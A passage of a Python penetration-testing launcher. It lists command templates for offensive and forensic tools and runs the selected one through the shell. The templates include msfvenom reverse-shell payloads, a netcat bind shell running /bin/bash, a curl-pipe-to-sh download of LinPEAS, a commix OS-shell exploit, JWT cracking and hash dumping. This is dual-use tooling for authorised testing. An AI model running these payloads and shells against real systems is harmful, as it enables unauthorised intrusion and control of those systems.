                        "description": "Start chisel server in reverse mode"
                    },
                    {
                        "command": "chisel client {server_ip}:8080 R:9000:localhost:22",
                        "description": "Create reverse tunnel to SSH"
                    }
                ]
            },
            
            # Firewall & IDS/IPS Evasion
            "msfvenom": {
                "description": "Metasploit payload generator",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={local_ip} LPORT=4444 -f exe > payload.exe",
                        "description": "Generate Windows meterpreter executable"
                    },
                    {
                        "command": "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={local_ip} LPORT=4444 -f elf > payload.elf",
                        "description": "Generate Linux meterpreter executable"
                    },
                    {
                        "command": "msfvenom -p java/meterpreter/reverse_tcp LHOST={local_ip} LPORT=4444 -f jar > payload.jar",
                        "description": "Generate Java meterpreter payload"
                    }
                ]
            },
            
            # Network Utilities
            "netcat": {
                "description": "TCP/IP swiss army knife",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "nc -l -p 4444",
                        "description": "Start a listener on port 4444"
                    },
                    {
                        "command": "nc {target} 4444",
                        "description": "Connect to target on port 4444"
                    },
                    {
                        "command": "nc -l -p 4444 -e /bin/bash",
                        "description": "Start listener with shell execution"
                    },
                    {
                        "command": "nc -v {target} 80",
                        "description": "Verbose connection to port 80"
                    },
                    {
                        "command": "nc -z {target} 1-1024",
                        "description": "Port scan (zero I/O mode)"
                    },
                    {
                        "command": "nc -l -p 4444 -k",
                        "description": "Keep listener running after disconnect"
                    },
                    {
                        "command": "nc -w 3 {target} 80",
                        "description": "Connect with 3 second timeout"
                    },
                    {
                        "command": "echo 'GET /' | nc {target} 80",
                        "description": "Send HTTP GET request"
                    },
                    {
                        "command": "nc -u {target} 53",
                        "description": "UDP connection to port 53"
                    },
                    {
                        "command": "nc -X 5 -x proxy:port {target} 80",
                        "description": "Connect through SOCKS5 proxy"
                    }
                ]
            },
            "curl": {
                "description": "Transfer data from or to a server",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "curl http://{target}",
                        "description": "Basic HTTP GET request"
                    },
                    {
                        "command": "curl -I http://{target}",
                        "description": "Get HTTP headers only"
                    },
                    {
                        "command": "curl -v http://{target}",
                        "description": "Verbose HTTP request"
                    },
                    {
                        "command": "curl -X POST http://{target} -d 'param=value'",
                        "description": "HTTP POST request with data"
                    },
                    {
                        "command": "curl -H 'User-Agent: Custom' http://{target}",
                        "description": "Request with custom header"
                    },
                    {
                        "command": "curl -b 'cookie=value' http://{target}",
                        "description": "Request with cookie"
                    },
                    {
                        "command": "curl -o output.html http://{target}",
                        "description": "Save output to file"
                    },
                    {
                        "command": "curl -k https://{target}",
                        "description": "Insecure TLS connection (ignore cert)"
                    },
                    {
                        "command": "curl -L http://{target}",
                        "description": "Follow redirects"
                    },
                    {
                        "command": "curl -x http://proxy:port http://{target}",
                        "description": "Request through HTTP proxy"
                    },
                    {
                        "command": "curl --user user:pass http://{target}",
                        "description": "Basic authentication"
                    },
                    {
                        "command": "curl -T file.txt http://{target}/upload",
                        "description": "Upload file"
                    },
                    {
                        "command": "curl -s http://{target}",
                        "description": "Silent mode (no progress meter)"
                    },
                    {
                        "command": "curl -w '%{http_code}' http://{target}",
                        "description": "Show HTTP status code"
                    }
                ]
            },
            "wget": {
                "description": "Network downloader",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "wget http://{target}/file.txt",
                        "description": "Download file"
                    },
                    {
                        "command": "wget -r http://{target}",
                        "description": "Recursive download"
                    },
                    {
                        "command": "wget -m http://{target}",
                        "description": "Mirror website"
                    },
                    {
                        "command": "wget -O output.html http://{target}",
                        "description": "Save with custom filename"
                    },
                    {
                        "command": "wget -q http://{target}",
                        "description": "Quiet mode"
                    },
                    {
                        "command": "wget --limit-rate=200k http://{target}",
                        "description": "Limit download rate"
                    },
                    {
                        "command": "wget -c http://{target}/file.iso",
                        "description": "Continue incomplete download"
                    },
                    {
                        "command": "wget --user-agent='Custom' http://{target}",
                        "description": "Custom user agent"
                    },
                    {
                        "command": "wget -i urls.txt",
                        "description": "Download from list of URLs"
                    },
                    {
                        "command": "wget --no-check-certificate https://{target}",
                        "description": "Skip certificate verification"
                    },
                    {
                        "command": "wget -np -r http://{target}/path/",
                        "description": "Recursive without parent directories"
                    }
                ]
            },
            "find": {
                "description": "Search for files in a directory hierarchy",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "find . -name '*.txt'",
                        "description": "Find all .txt files in current directory"
                    },
                    {
                        "command": "find / -name 'config.php' 2>/dev/null",
                        "description": "Find config.php file system-wide"
                    },
                    {
                        "command": "find . -type f -executable",
                        "description": "Find all executable files"
                    },
                    {
                        "command": "find . -perm -4000",
                        "description": "Find files with SUID bit set"
                    },
                    {
                        "command": "find . -perm -2000",
                        "description": "Find files with SGID bit set"
                    },
                    {
                        "command": "find . -type f -name '*.conf'",
                        "description": "Find all configuration files"
                    },
                    {
                        "command": "find . -type f -name '*.log'",
                        "description": "Find all log files"
                    },
                    {
                        "command": "find . -type f -size +100M",
                        "description": "Find files larger than 100MB"
                    },
                    {
                        "command": "find . -type f -mtime -7",
                        "description": "Find files modified in last 7 days"
                    },
                    {
                        "command": "find . -type f -user root",
                        "description": "Find files owned by root"
                    },
                    {
                        "command": "find /etc -name '*.conf' -exec cat {} \\;",
                        "description": "Find and display all config files"
                    },
                    {
                        "command": "find . -name '*.bak' -delete",
                        "description": "Find and delete all backup files"
                    }
                ]
            },
            
            # File Sharing & Web Server
            "http.server": {
                "description": "Python HTTP server for file sharing",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "python3 -m http.server 8000",
                        "description": "Start HTTP server on port 8000"
                    },
                    {
                        "command": "python3 -m http.server 8080 --bind 0.0.0.0",
                        "description": "Start HTTP server on all interfaces"
                    },
                    {
                        "command": "python -m SimpleHTTPServer 8000",
                        "description": "Python 2 HTTP server"
                    },
                    {
                        "command": "python3 -m http.server 8000 --directory /path/to/files",
                        "description": "Serve specific directory"
                    },
                    {
                        "command": "nohup python3 -m http.server 8000 &",
                        "description": "Run server in background"
                    }
                ]
            },
            
            # Hollywood Hacker & Cool Simulations (Just For Fun!)
            "cmatrix": {
                "description": "Matrix-style falling characters (The Matrix movie effect)",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "cmatrix",
                        "description": "Default Matrix falling code effect - Press Ctrl+C to exit"
                    },
                    {
                        "command": "cmatrix -b",
                        "description": "Bold characters"
                    },
                    {
                        "command": "cmatrix -C green",
                        "description": "Green Matrix (classic movie style)"
                    },
                    {
                        "command": "cmatrix -u 2",
                        "description": "Faster falling speed"
                    }
                ]
            },
            "hollywood": {
                "description": "Hollywood hacker terminal - looks like movie hacking scene",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "hollywood",
                        "description": "Full Hollywood hacker mode (Press Ctrl+C to exit)"
                    }
                ]
            },
            "cowsay": {
                "description": "ASCII cow that says things - fun terminal decoration",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "cowsay 'Hello Hacker!'",
                        "description": "Cow says hello"
                    },
                    {
                        "command": "cowsay -f dragon 'I am a dragon!'",
                        "description": "Dragon mode"
                    },
                    {
                        "command": "cowsay -f tux 'Linux rules!'",
                        "description": "Tux penguin mode"
                    },
                    {
                        "command": "cowsay -f vader 'I am your father'",
                        "description": "Darth Vader mode"
                    }
                ]
            },
            "figlet": {
                "description": "ASCII art text - create big banner letters",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "figlet 'HACKER'",
                        "description": "Basic ASCII art text"
                    },
                    {
                        "command": "figlet -f banner 'OWNED'",
                        "description": "Banner font style"
                    },
                    {
                        "command": "figlet -f digital 'ACCESS GRANTED'",
                        "description": "Digital display style"
                    },
                    {
                        "command": "figlet -f slant 'KALI LINUX'",
                        "description": "Slanted style"
                    }
                ]
            },
            "lolcat": {
                "description": "Rainbow colors for any command output",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "echo 'HACK THE PLANET' | lolcat",
                        "description": "Rainbow text"
                    },
                    {
                        "command": "ls -la | lolcat",
                        "description": "Colorful directory listing"
                    },
                    {
                        "command": "figlet 'HACKER' | lolcat",
                        "description": "Big rainbow text"
                    }
                ]
            },
            "sl": {
                "description": "Steam locomotive - funny animation",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "sl",
                        "description": "Default steam locomotive"
                    },
                    {
                        "command": "sl -F",
                        "description": "Flying train"
                    },
                    {
                        "command": "sl -alF",
                        "description": "All effects combined"
                    }
                ]
            },
            
            # Privilege Escalation & Enumeration
            "linpeas": {
                "description": "Linux Privilege Escalation Awesome Script",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "./linpeas.sh",
                        "description": "Run LinPEAS privilege escalation script"
                    },
                    {
                        "command": "./linpeas.sh -a",
                        "description": "Run all checks"
                    },
                    {
                        "command": "./linpeas.sh -s -r",
                        "description": "Run in super stealth mode"
                    },
                    {
                        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
                        "description": "Download and run LinPEAS directly"
                    }
                ]
            },
            "winpeas": {
                "description": "Windows Privilege Escalation Awesome Script",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "winPEASx64.exe",
                        "description": "Run WinPEAS 64-bit"
                    },
                    {
                        "command": "winPEASx86.exe",
                        "description": "Run WinPEAS 32-bit"
                    },
                    {
                        "command": "winPEAS.bat",
                        "description": "Run WinPEAS batch script"
                    }
                ]
            },
            "linenum": {
                "description": "Linux enumeration script",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "./LinEnum.sh",
                        "description": "Run Linux enumeration script"
                    },
                    {
                        "command": "./LinEnum.sh -t",
                        "description": "Run thorough tests"
                    },
                    {
                        "command": "./LinEnum.sh -k password",
                        "description": "Search for keyword in interesting files"
                    }
                ]
            },
            "linux-smart-enumeration": {
                "description": "Linux enumeration script with verbosity levels",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "./lse.sh",
                        "description": "Run with default verbosity"
                    },
                    {
                        "command": "./lse.sh -l 1",
                        "description": "Run with level 1 (interesting information)"
                    },
                    {
                        "command": "./lse.sh -l 2",
                        "description": "Run with level 2 (all checks)"
                    },
                    {
                        "command": "./lse.sh -i",
                        "description": "Non-interactive mode"
                    }
                ]
            },
            "pspy": {
                "description": "Unprivileged Linux process snooping",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "./pspy64",
                        "description": "Monitor processes (64-bit)"
                    },
                    {
                        "command": "./pspy32",
                        "description": "Monitor processes (32-bit)"
                    },
                    {
                        "command": "./pspy64 -pf -i 1000",
                        "description": "Monitor with file system events, 1 second interval"
                    }
                ]
            },
            "sudo_killer": {
                "description": "Tool to identify and exploit sudo rules",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "./sudo_killer.sh -c -r report.txt",
                        "description": "Check for sudo vulnerabilities"
                    },
                    {
                        "command": "./sudo_killer.sh -e",
                        "description": "Exploit mode"
                    }
                ]
            },
            
            # Forensics & Data Recovery
            "volatility": {
                "description": "Memory forensics framework",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "volatility -f memory.dump imageinfo",
                        "description": "Identify memory dump profile"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 pslist",
                        "description": "List running processes"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 pstree",
                        "description": "Display process tree"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 netscan",
                        "description": "Scan for network connections"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 filescan",
                        "description": "Scan for file objects"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 dumpfiles -Q 0x... --dump-dir=./",
                        "description": "Dump specific file from memory"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 hashdump",
                        "description": "Extract password hashes"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 hivelist",
                        "description": "List registry hives"
                    },
                    {
                        "command": "volatility -f memory.dump --profile=Win7SP1x64 cmdline",
                        "description": "Display process command line arguments"
                    }
                ]
            },
            "autopsy": {
                "description": "Digital forensics platform",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "autopsy",
                        "description": "Launch Autopsy GUI"
                    }
                ]
            },
            "foremost": {
                "description": "File carving tool for recovering deleted files",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "foremost -i disk.img -o output/",
                        "description": "Carve files from disk image"
                    },
                    {
                        "command": "foremost -t jpg,png,pdf -i disk.img -o output/",
                        "description": "Carve specific file types"
                    },
                    {
                        "command": "foremost -v -i disk.img -o output/",
                        "description": "Verbose mode"
                    }
                ]
            },
            "scalpel": {
                "description": "Fast file carver",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "scalpel disk.img -o output/",
                        "description": "Carve files from disk image"
                    },
                    {
                        "command": "scalpel -c scalpel.conf disk.img -o output/",
                        "description": "Use custom configuration file"
                    }
                ]
            },
            "bulk_extractor": {
                "description": "Digital forensics tool that extracts features",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "bulk_extractor -o output disk.img",
                        "description": "Extract features from disk image"
                    },
                    {
                        "command": "bulk_extractor -o output -e email -e url disk.img",
                        "description": "Extract emails and URLs only"
                    }
                ]
            },
            "ddrescue": {
                "description": "Data recovery tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "ddrescue /dev/sda disk.img logfile",
                        "description": "Recover data from failing drive"
                    },
                    {
                        "command": "ddrescue -r 3 /dev/sda disk.img logfile",
                        "description": "Retry bad sectors 3 times"
                    }
                ]
            },
            "photorec": {
                "description": "File data recovery software",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "photorec /dev/sda",
                        "description": "Recover files from device"
                    },
                    {
                        "command": "photorec disk.img",
                        "description": "Recover files from disk image"
                    }
                ]
            },
            "testdisk": {
                "description": "Partition recovery tool",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "testdisk /dev/sda",
                        "description": "Recover partitions on device"
                    },
                    {
                        "command": "testdisk disk.img",
                        "description": "Recover partitions from image"
                    }
                ]
            },
            
            # API Testing
            "postman": {
                "description": "API development and testing platform",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "postman",
                        "description": "Launch Postman GUI"
                    }
                ]
            },
            "burpsuite": {
                "description": "Web application security testing",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "burpsuite",
                        "description": "Launch Burp Suite"
                    },
                    {
                        "command": "java -jar burpsuite_community.jar",
                        "description": "Launch Burp Suite Community"
                    },
                    {
                        "command": "java -jar -Xmx4g burpsuite_community.jar",
                        "description": "Launch with 4GB memory"
                    }
                ]
            },
            "zaproxy": {
                "description": "OWASP ZAP - Web application security scanner",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "zaproxy",
                        "description": "Launch ZAP GUI"
                    },
                    {
                        "command": "zap-cli quick-scan -s all http://{target}",
                        "description": "Quick scan of target"
                    },
                    {
                        "command": "zap-cli active-scan http://{target}",
                        "description": "Active scan of target"
                    }
                ]
            },
            "commix": {
                "description": "Command injection exploitation tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "commix --url=\\\"http://{target}/page.php?id=1\\\"",
                        "description": "Test for command injection"
                    },
                    {
                        "command": "commix --url=\\\"http://{target}/page.php?id=1\\\" --os-shell",
                        "description": "Get OS shell through command injection"
                    }
                ]
            },
            "jwt_tool": {
                "description": "JWT security testing toolkit",
                "requires_target": False,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "jwt_tool <token>",
                        "description": "Analyze JWT token"
                    },
                    {
                        "command": "jwt_tool -t http://{target}/ -rh \"Authorization: Bearer <token>\" -M at",
                        "description": "Test all attacks on endpoint"
                    },
                    {
                        "command": "jwt_tool <token> -C -d wordlist.txt",
                        "description": "Crack JWT secret"
                    }
                ]
            },
            "arjun": {
                "description": "HTTP parameter discovery suite",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "arjun -u http://{target}",
                        "description": "Discover hidden parameters"
                    },
                    {
                        "command": "arjun -u http://{target} -m POST",
                        "description": "Discover POST parameters"
                    },
                    {
                        "command": "arjun -u http://{target} -t 10",
                        "description": "Use 10 threads"
                    }
                ]
            },
            "sublist3r": {
                "description": "Subdomain enumeration tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "sublist3r -d {target}",
                        "description": "Enumerate subdomains"
                    },
                    {
                        "command": "sublist3r -d {target} -t 10",
                        "description": "Enumerate with 10 threads"
                    },
                    {
                        "command": "sublist3r -d {target} -b",
                        "description": "Enable brute force module"
                    },
                    {
                        "command": "sublist3r -d {target} -p 80,443",
                        "description": "Enumerate and check specific ports"
                    }
                ]
            },
            "subfinder": {
                "description": "Subdomain discovery tool",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "subfinder -d {target}",
                        "description": "Discover subdomains"
                    },
                    {
                        "command": "subfinder -d {target} -silent",
                        "description": "Silent mode, show only results"
                    },
                    {
                        "command": "subfinder -d {target} -o output.txt",
                        "description": "Save results to file"
                    },
                    {
                        "command": "subfinder -d {target} -all",
                        "description": "Use all sources"
                    }
                ]
            },
            "assetfinder": {
                "description": "Find domains and subdomains",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "assetfinder {target}",
                        "description": "Find related domains"
                    },
                    {
                        "command": "assetfinder --subs-only {target}",
                        "description": "Find only subdomains"
                    }
                ]
            },
            "amass": {
                "description": "In-depth attack surface mapping",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "amass enum -d {target}",
                        "description": "Enumerate subdomains"
                    },
                    {
                        "command": "amass enum -d {target} -active",
                        "description": "Active enumeration with port scanning"
                    },
                    {
                        "command": "amass enum -d {target} -brute",
                        "description": "Brute force subdomains"
                    },
                    {
                        "command": "amass intel -d {target}",
                        "description": "Collect intelligence on target"
                    },
                    {
                        "command": "amass enum -d {target} -o output.txt",
                        "description": "Save results to file"
                    }
                ]
            },
            "httpx": {
                "description": "Fast HTTP probe",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "echo {target} | httpx",
                        "description": "Probe single target"
                    },
                    {
                        "command": "cat domains.txt | httpx",
                        "description": "Probe multiple targets"
                    },
                    {
                        "command": "cat domains.txt | httpx -status-code",
                        "description": "Show status codes"
                    },
                    {
                        "command": "cat domains.txt | httpx -title -tech-detect",
                        "description": "Show title and detect technologies"
                    },
                    {
                        "command": "cat domains.txt | httpx -mc 200,301,302",
                        "description": "Filter by status code"
                    }
                ]
            },
            "waybackurls": {
                "description": "Fetch URLs from Wayback Machine",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "echo {target} | waybackurls",
                        "description": "Get archived URLs for domain"
                    },
                    {
                        "command": "echo {target} | waybackurls | grep -E '\\.js$'",
                        "description": "Get archived JavaScript files"
                    }
                ]
            },
            "gau": {
                "description": "Get All URLs from various sources",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "gau {target}",
                        "description": "Fetch URLs for domain"
                    },
                    {
                        "command": "gau --subs {target}",
                        "description": "Include subdomains"
                    },
                    {
                        "command": "gau --blacklist png,jpg,gif {target}",
                        "description": "Exclude certain extensions"
                    }
                ]
            },
            "dalfox": {
                "description": "Powerful XSS scanner",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "dalfox url http://{target}/?id=1",
                        "description": "Scan URL for XSS"
                    },
                    {
                        "command": "dalfox file urls.txt",
                        "description": "Scan multiple URLs from file"
                    },
                    {
                        "command": "dalfox url http://{target}/?id=1 --deep-domxss",
                        "description": "Deep DOM XSS analysis"
                    }
                ]
            },
            "xsser": {
                "description": "Cross Site Scripter automated framework",
                "requires_target": True,
                "requires_wordlist": False,
                "commands": [
                    {
                        "command": "xsser --url \\\"http://{target}/?q=XSS\\\"",
                        "description": "Test for XSS vulnerability"
                    },
                    {
                        "command": "xsser --url \\\"http://{target}/?q=XSS\\\" --auto",
                        "description": "Automatic attack mode"
                    }
                ]
            }
        }
    
    def _initialize_wordlists(self):
        """Initialize common wordlist locations with dynamic SecLists scanning"""
        wordlists = {
            "directory": [],
            "subdomain": [],
            "password": [],
            "username": [],
            "fuzzing": [],
            "api": []
        }
        
        # Common wordlist base paths
        base_paths = [
            "/usr/share/wordlists",
            "/usr/share/seclists",
            "/opt/SecLists",
            "~/SecLists",
            "/usr/share/wordlists/seclists"
        ]
        
        # Expand home directory
        base_paths = [os.path.expanduser(p) for p in base_paths]
        
        # Find SecLists directory
        seclists_path = None
        for path in base_paths:
            if os.path.exists(path):
                if "seclists" in path.lower() or os.path.exists(os.path.join(path, "Discovery")):
                    seclists_path = path
                    break
        
        # Directory/Web Content wordlists
        directory_paths = [
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/wordlists/dirb/big.txt",
        ]
        
        if seclists_path:
            # Add SecLists Discovery wordlists
            discovery_web = os.path.join(seclists_path, "Discovery", "Web-Content")
            if os.path.exists(discovery_web):
                for file in ["common.txt", "directory-list-2.3-medium.txt", 
                            "directory-list-2.3-small.txt", "big.txt",
                            "raft-medium-directories.txt", "raft-large-directories.txt",
                            "directory-list-lowercase-2.3-medium.txt"]:
                    full_path = os.path.join(discovery_web, file)
                    if os.path.exists(full_path):
                        directory_paths.append(full_path)
        
        wordlists["directory"] = directory_paths
        
        # Subdomain wordlists
        subdomain_paths = []
        if seclists_path:
            dns_path = os.path.join(seclists_path, "Discovery", "DNS")
            if os.path.exists(dns_path):
                for file in ["subdomains-top1million-5000.txt", 
                            "subdomains-top1million-20000.txt",
                            "subdomains-top1million-110000.txt",
                            "bitquark-subdomains-top100000.txt",
                            "fierce-hostlist.txt"]:
                    full_path = os.path.join(dns_path, file)
                    if os.path.exists(full_path):
                        subdomain_paths.append(full_path)
        
        wordlists["subdomain"] = subdomain_paths
        
        # Password wordlists
        password_paths = [
            "/usr/share/wordlists/rockyou.txt",
        ]
        
        if seclists_path:
            passwords_path = os.path.join(seclists_path, "Passwords")
            if os.path.exists(passwords_path):
                # Common Credentials
                common_creds = os.path.join(passwords_path, "Common-Credentials")
                if os.path.exists(common_creds):
                    for file in ["10-million-password-list-top-1000000.txt",
                                "10-million-password-list-top-100000.txt",
                                "10-million-password-list-top-10000.txt",
                                "10-million-password-list-top-1000.txt",
                                "best1050.txt", "best110.txt"]:
                        full_path = os.path.join(common_creds, file)
                        if os.path.exists(full_path):
                            password_paths.append(full_path)
                
                # Leaked Databases
                leaked = os.path.join(passwords_path, "Leaked-Databases")
                if os.path.exists(leaked):
                    for file in ["rockyou-75.txt", "rockyou-50.txt"]:
                        full_path = os.path.join(leaked, file)
                        if os.path.exists(full_path):
                            password_paths.append(full_path)
        
        wordlists["password"] = password_paths
        
        # Username wordlists
        username_paths = []
        if seclists_path:
            usernames_path = os.path.join(seclists_path, "Usernames")
            if os.path.exists(usernames_path):
                for file in ["top-usernames-shortlist.txt",
                            "xato-net-10-million-usernames.txt",
                            "Names/names.txt",
                            "cirt-default-usernames.txt"]:
                    full_path = os.path.join(usernames_path, file)
                    if os.path.exists(full_path):
                        username_paths.append(full_path)
        
        wordlists["username"] = username_paths
        
        # Fuzzing wordlists
        fuzzing_paths = []
        if seclists_path:
            fuzzing_path = os.path.join(seclists_path, "Fuzzing")
            if os.path.exists(fuzzing_path):
                for file in ["LFI/LFI-Jhaddix.txt",
                            "SQLi/Generic-SQLi.txt",
                            "XSS/XSS-Jhaddix.txt",
                            "command-injection-commix.txt"]:
                    full_path = os.path.join(fuzzing_path, file)
                    if os.path.exists(full_path):
                        fuzzing_paths.append(full_path)
        
        wordlists["fuzzing"] = fuzzing_paths
        
        # API wordlists
        api_paths = []
        if seclists_path:
            api_path = os.path.join(seclists_path, "Discovery", "Web-Content")
            if os.path.exists(api_path):
                for file in ["api/api-endpoints.txt",
                            "api/objects.txt",
                            "swagger.txt"]:
                    full_path = os.path.join(api_path, file)
                    if os.path.exists(full_path):
                        api_paths.append(full_path)
        
        wordlists["api"] = api_paths
        
        return wordlists
    
    def run_command(self, command, tool_name="", target=""):
        """Execute a command in the system shell"""
        try:
            print(f"\n[+] Executing: {command}")
            
            # Run command and capture output
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            # Display output
            if result.stdout:
                print(result.stdout)
            if result.stderr:
                print(result.stderr, file=sys.stderr)
            
            # Save output if enabled
            output = f"STDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}"
            self.save_output(tool_name, command, output, target)
            
            # Add to history
            if tool_name:
                self.add_to_history(tool_name, command, target)
            
            print(f"[+] Command completed with exit code: {result.returncode}")
            
        except subprocess.TimeoutExpired:
            print(f"[!] Command timed out after 5 minutes")
        except subprocess.CalledProcessError as e:
            print(f"[!] Error executing command: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
    
    def get_tool_info(self, tool_name):
        """Get information about a specific tool"""
        tool_name = tool_name.lower()
        if tool_name in self.tools_db:
            return self.tools_db[tool_name]
        return None
    
    def suggest_wordlist(self, list_type):
        """Suggest wordlists based on type with better availability checking"""
        if list_type not in self.common_wordlists:
            list_type = "directory"  # Default fallback
        
        wordlists = self.common_wordlists.get(list_type, [])
        
        if not wordlists:
            print(f"\n[!] No {list_type} wordlists configured")
            custom_path = input("Enter custom wordlist path: ").strip()
            if custom_path and os.path.exists(custom_path):
                return custom_path
            return None
        
        # Filter to only available wordlists
        available = [(i, w) for i, w in enumerate(wordlists, 1) if os.path.exists(w)]
        unavailable = [(i, w) for i, w in enumerate(wordlists, 1) if not os.path.exists(w)]
        
        print(f"\n[+] {list_type.title()} Wordlists:")
        
        if available:
            print(f"\n[Available]")
            for i, wordlist in available:
                size = os.path.getsize(wordlist)
                size_mb = size / (1024 * 1024)
                if size_mb < 1:
                    size_str = f"{size / 1024:.1f} KB"
                else:
                    size_str = f"{size_mb:.1f} MB"
                print(f"  {i}. {os.path.basename(wordlist)} ({size_str})")
                print(f"     {wordlist}")
        
        if unavailable:
            print(f"\n[Not Found]")
            for i, wordlist in unavailable[:3]:  # Show only first 3
                print(f"  {i}. {os.path.basename(wordlist)}")
        
        if not available:
            print(f"\n[!] No {list_type} wordlists found on system")
            print(f"[!] Install SecLists: sudo apt install seclists")
            custom_path = input("\nEnter custom wordlist path or press Enter to skip: ").strip()
            if custom_path and os.path.exists(custom_path):
                return custom_path
            return None
        
        print(f"\n  0. Custom path")
        
        while True:
            choice = input(f"\nSelect wordlist (1-{len(wordlists)}, 0=custom): ").strip()
            
            if choice == '0':
                custom_path = input("Enter custom wordlist path: ").strip()
                if custom_path and os.path.exists(custom_path):
                    return custom_path
                else:
                    print(f"[!] File not found: {custom_path}")
                    continue
            
            elif choice.isdigit() and 1 <= int(choice) <= len(wordlists):
                selected = wordlists[int(choice) - 1]
                if os.path.exists(selected):
                    return selected
                else:
                    print(f"[!] Wordlist not found: {selected}")
                    print(f"[!] Install with: sudo apt install seclists")
                    retry = input("Try another? (y/n): ").strip().lower()
                    if retry != 'y':
                        return None
            
            elif choice == '':
                # Return first available
                if available:
                    return available[0][1]
                return None
            
            else:
                print("[!] Invalid selection. Please try again.")
    
    def interact_with_tool(self, tool_name):
        """Interactive session with a specific tool"""
        try:
            tool_info = self.get_tool_info(tool_name)
            if not tool_info:
                print(f"[!] Tool '{tool_name}' not found in database.")
                return
            
            # Check if tool is installed and prompt to install if not
            if not self.prompt_install_tool(tool_name):
                return
            
            print(f"\n[+] Tool: {tool_name}")
            print(f"[+] Description: {tool_info['description']}")
            
            target = ""
            wordlist = ""
            local_ip = ""
            targets = []
            
            # Get required inputs
            if tool_info.get("requires_target"):
                target_input = input(f"\nEnter target(s) (IP/domain, comma-separated for multiple): ").strip()
                if not target_input:
                    print("[!] Target is required for this tool.")
                    return
                
                # Support multi-target
                if ',' in target_input:
                    targets = [t.strip() for t in target_input.split(',')]
                    target = targets[0]  # Use first for display
                    print(f"[+] Multi-target mode: {len(targets)} targets")
                else:
                    target = target_input
                    targets = [target]
            
            if tool_info.get("requires_wordlist"):
                list_type = "directory"  # Default type
                if tool_name in ["hydra", "medusa", "ncrack", "weevely"]:
                    list_type = "password"
                elif tool_name in ["dnsrecon", "dnsenum"]:
                    list_type = "subdomain"
                elif tool_name in ["john", "hashcat"]:
                    list_type = "password"
                
                wordlist = self.suggest_wordlist(list_type)
            
            # Get local IP if needed
            if tool_name in ["msfconsole", "msfvenom"]:
                local_ip = input(f"\nEnter your local IP address: ").strip()
                if not local_ip:
                    print("[!] Local IP is required for this tool.")
                    return
            
            # Display command options
            print(f"\n[+] Available commands for {tool_name}:")
            for i, cmd in enumerate(tool_info["commands"], 1):
                print(f"  {i}. {cmd['command'].format(target=target, wordlist=wordlist, local_ip=local_ip)}")
                print(f"     Description: {cmd['description']}")
            
            # Get command selection
